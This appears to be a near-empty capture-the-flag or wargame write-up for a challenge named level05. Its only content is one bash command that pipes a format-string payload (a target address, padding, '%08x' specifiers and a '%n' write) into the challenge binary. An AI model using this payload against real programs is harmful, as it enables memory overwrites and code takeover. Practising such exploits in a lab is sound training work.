## Brief

## Exploit

## Commands

```bash
(python -c "print('\xe0\x97\x04\x08' + 'A'*21 + '%08x'*9 + '%n')") | ./level05
```